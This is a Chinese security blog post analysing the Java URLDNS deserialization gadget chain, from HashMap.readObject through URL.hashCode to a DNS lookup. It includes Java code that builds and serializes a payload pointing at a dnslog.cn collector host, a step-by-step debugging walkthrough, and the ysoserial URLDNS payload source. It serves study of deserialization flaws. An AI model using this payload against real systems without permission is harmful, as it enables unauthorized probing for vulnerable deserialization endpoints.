<h2 id="2-URLDNS链"><a href="#2-URLDNS链" class="headerlink" title="2. URLDNS链"></a>2. URLDNS链</h2><h3 id="2-1-URLDNS链"><a href="#2-1-URLDNS链" class="headerlink" title="2.1 URLDNS链"></a>2.1 URLDNS链</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;URL, Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://r2t55a.dnslog.cn&quot;</span>);</span><br><span class="line">Class&lt;? <span class="keyword">extends</span> <span class="title class_">URL</span>&gt; clazz = url.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">code</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">code.setAccessible(<span class="literal">true</span>);</span><br><span class="line">code.set(url, <span class="number">1</span>); <span class="comment">// 为了让getHostName()不执行</span></span><br><span class="line">hashMap.put(url, <span class="number">1</span>);</span><br><span class="line">code.set(url, -<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<h3 id="2-2-序列化与反序列化"><a href="#2-2-序列化与反序列化" class="headerlink" title="2.2 序列化与反序列化"></a>2.2 序列化与反序列化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">objectOutputStream.writeObject(hashMap);</span><br><span class="line">fileOutputStream.close();</span><br><span class="line">objectOutputStream.close();</span><br><span class="line"></span><br><span class="line"><span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">System.out.println(o);</span><br><span class="line">objectInputStream.close();</span><br><span class="line">fileInputStream.close();</span><br></pre></td></tr></table></figure>

<h3 id="2-5-结果"><a href="#2-5-结果" class="headerlink" title="2.5 结果"></a>2.5 结果</h3><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221016193325967.png" alt="image-20221016193325967"></p>
<h3 id="2-6-Gadget利用链分析"><a href="#2-6-Gadget利用链分析" class="headerlink" title="2.6 Gadget利用链分析"></a>2.6 Gadget利用链分析</h3><h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><p>HashMap.readObject() -&gt; HashMap.putVal()-&gt;HashMap.hash()-&gt;URL.hashcode()-&gt;URLStreamHandler().hashCode().getHostAddress-&gt;URLStreamHandler().hashCode().getHostAddress().getByName()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> HashMap-&gt;readObject()</span><br><span class="line"><span class="number">2.</span> HashMap-&gt;hash()</span><br><span class="line"><span class="number">3.</span> URL-&gt;hashCode()</span><br><span class="line"><span class="number">4.</span> URLStreamHandler-&gt;hashCode()</span><br><span class="line"><span class="number">5.</span> URLStreamHandler-&gt;getHostAddress()</span><br><span class="line"><span class="number">6.</span> InetAddress-&gt;getByName()</span><br></pre></td></tr></table></figure>

<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><code>java.util.HashMap</code>实现了<code>Serializable</code>接口，重写了<code>readObject</code>, 在反序列化时会调用<code>hash</code>函数计算<code>key</code>的<code>hashCode</code>，而<code>java.net.URL</code>的<code>hashCode</code>在计算时会调用<code>getHostAddress</code>来解析域名, 从而发出<code>DNS</code>请求。</p>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><ol>
<li>入口类重写readObject方法</li>
<li>入口类可传入任意对象（这种类一般为集合类）</li>
<li>执行类可被利用执行危险或任意函数</li>
</ol>
<p>这条链的入口类是<code>java.util.HashMap</code>，入口类的条件是：</p>
<ol>
<li><p>实现Serializable接口 </p>
</li>
<li><p>重写readObject()方法 </p>
</li>
<li><p>接收参数宽泛 4.多为JDK自带</p>
</li>
</ol>
<h4 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h4><p>首先看一下<code>HashMap</code>，这个类实现了<code>Serializable</code>接口</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017094702114.png" alt="image-20221017094702114"></p>
<p>重写了<code>readObject</code>方法，重写方法因为<code>HashMap&lt;K,V&gt;</code>存储数据采用的哈希表结构，元素的存取顺序不能保证一致。由于要保证键的唯一、不重复，在反序列化过程中就需要对<code>Key</code>进行hash，这样一来就需要重写<code>readObject</code>方法。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017094913788.png" alt="image-20221017094913788"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017094937165.png" alt="image-20221017094937165"></p>
<p><code>putVal()</code>就是哈希表结构存储函数，它调用了<code>hash</code>函数，根据key产生hash。</p>
<p>查看<code>hash()</code>方法，通过相与和位运算计算hash值：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017095204447.png" alt="image-20221017095204447"></p>
<p>很多类中都具有<code>hashCode</code>方法（用来进行哈希），所以接下来考虑有没有可能存在某个特殊的类<code>M</code>，其<code>hashCode</code>方法中直接或间接可调用危险函数。这条URLDNS链中使用的执行类就是<code>URL</code>类。看URL类之前，还需要确定一下<code>HashMap</code>在<code>readObject</code>过程中能够正常执行到<code>putVal()</code>方法这里，以及传入<code>hash</code>方法中的参数对象<code>keys</code>是可控的。</p>
<p>首先可以看到，参数对象<code>Key</code>由<code>s.readObject()</code>获取，<code>s</code>是输入的序列化流，证明<code>key</code>是可控的。只要mappings的长度大于0，也就是序列化流不为空就满足利用条件。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017100153211.png" alt="image-20221017100153211"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017100222477.png" alt="image-20221017100222477"></p>
<p>可以通过<code>HashMap</code> 反序列化调用K&#x2F;V的<code>readObject()</code> 。</p>
<h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>入口类HashMap已经分析完成，具备了利用条件，具体在分析一下<code>URL</code>类的<code>hashCode</code>方法。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017100511427.png" alt="image-20221017100511427"></p>
<p>可以看到当<code>hashCode</code>属性的值为-1时，跳过if条件，执行<code>handler</code>对象的<code>hashCode</code>方法，并将自身<code>URL</code>类的实例作为参数传入。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017100813989.png" alt="image-20221017100813989"></p>
<p>进入了<code>URLStreamHandler</code>对象的<code>hashCode()</code>方法，接收<code>URL</code>类的实例，调⽤<code>getHostAddress</code>⽅法。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017101008844.png" alt="image-20221017101008844"></p>
<p>继续跟进<code>getHostAddress</code>⽅法，<code>getHostAddress</code>方法中会获取传入的<code>URL</code>对象的IP，也就是会进行DNS请求，这⾥ <code>InetAddress.getByName(host) </code>的作⽤是根据主机名，获取其IP地址，在⽹络上其实就是⼀次DNS查询。</p>
<h4 id="调试流程"><a href="#调试流程" class="headerlink" title="调试流程"></a>调试流程</h4><blockquote>
<p>先看正向分析</p>
</blockquote>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017102423692.png" alt="这里使用强制步入可以看流程"></p>
<p>先将断点打在put()上：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017102731835.png" alt="image-20221017102731835"></p>
<p>强制步进后进入HashMap的put方法：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017102908856.png" alt="image-20221017102908856"></p>
<p>然后调用HashMap的<code>hash()</code> 方法：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017103024021.png" alt="image-20221017103024021"></p>
<p>然后进入<code>URL</code> 的<code>hashCode()</code>的方法(传入的参数是Object，就是我们传入的URL)：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017103126576.png" alt="image-20221017103126576"></p>
<p>只有在<code>hashCode</code>这个字段值是-1的情况下，我们才可以进入<code>handler.hashCode()</code> ，到<code>URLStreamHandler</code> 对象的<code>hashCode()</code> 上</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017104119390.png" alt="image-20221017104119390"></p>
<p>进入到<code>getHostAddress()</code>方法：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017104251943.png" alt="image-20221017104251943"></p>
<p>然后进入<code>getByName()</code>请求发包。</p>
<blockquote>
<p>再看反序列化流程分析</p>
</blockquote>
<p>现在这两处下断，先通过<code>readObject()</code>将HashMap反序列化，我们这里以Key传URL。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017133854848.png" alt="image-20221017133854848"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017134321726.png" alt="image-20221017134321726"></p>
<p>key这个对象已经是URL对象了，我们需要调用的是URL中的<code>hashCode()</code>方法，需要通过<code>hash()</code> 方法执行，接着往里调试。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017134539572.png" alt="image-20221017134539572"></p>
<p>到了<code>Object.hashCode()</code> 这里，我们知道就是<code>URL.hashCode()</code> </p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017134720271.png" alt="image-20221017134720271"></p>
<p>因为我们修改过hashCode&#x3D;-1，就可以执行我们要发请求的方法<code>handler.hashCode()</code> ，是调用<code>URLStreamHandler</code>对象的<code>hashCode()</code>方法。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images@master/img/image-20221017134834331.png" alt="image-20221017134834331"></p>
<p>然后在<code>getHostAddress()</code> 中发DNS请求。</p>
<h3 id="2-7-阅读ysoserial的POC"><a href="#2-7-阅读ysoserial的POC" class="headerlink" title="2.7 阅读ysoserial的POC"></a>2.7 阅读ysoserial的POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); </span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); </span><br><span class="line">                ht.put(u, url); </span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); </span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里主要阅读<code>getObject()</code>这代码：</p>
<ol>
<li><code>new SilentURLStreamHandler()</code>首先实例化一个自定义的继承于URLStreamHandler的类，URLStreamHandler在我们链中的<code>hashCode()</code>这就是调用<code>getHostName()</code>的关键位置，他继承了一个空方法，所以调用的还是原来<code>URLStreamHandler</code> 的值。</li>
<li><code>new HashMap()</code>是我们的入口点，后面就如同Gadget利用链一样</li>
<li><code>Relections.setFieldValue()</code>是封装过的<code>class.getDeclaredField()</code>所以全部流程与Gadget一样，后在反序列化中同样执行<code>put()</code>-&gt;<code>putVal()</code>-&gt;<code>hash()</code>-&gt;<code>hashCode()</code>-&gt;<code>getHostName()</code></li>
</ol>


<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>许可协议</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
</div></section></div>

</article>

<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>接下来阅读</span></section><section class="body fs14"><a id="next" href="/2022/10/10/cve-2012-2122/">cve-2012-2122<span class="note">较早</span></a><div class="line"></div></section></div>








      
<footer class="page-footer reveal fs12"><hr><div class="text"><p>本站由 <a href="http://example.com/">@z-bool</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.9.0" title="v1.9.0">Stellar</a> 主题创建。</p>
</div></footer>

      <div class='float-panel mobile-only blur' style='display:none'>
  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
  </button>
</div>

    </div>
  </div>
  <div class='scripts'>
    <script type="text/javascript">
  stellar = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    loadCSS: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    // 从 butterfly 和 volantis 获得灵感
    loadScript: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    // https://github.com/jerryc127/hexo-theme-butterfly
    jQuery: (fn) => {
      if (typeof jQuery === 'undefined') {
        stellar.loadScript(stellar.plugins.jQuery).then(fn)
      } else {
        fn()
      }
    }
  };
  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.9.0';
  stellar.config = {
    date_suffix: {
      just: '刚刚',
      min: '分钟前',
      hour: '小时前',
      day: '天前',
      month: '个月前',
    },
  };

  // required plugins (only load if needs)
  stellar.plugins = {
    jQuery: 'https://fastly.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
    sitesjs: '/js/plugins/sites.js',
    friendsjs: '/js/plugins/friends.js',
  };

  // optional plugins
  if ('true' == 'true') {
    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://fastly.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
  }
  if ('true' == 'true') {
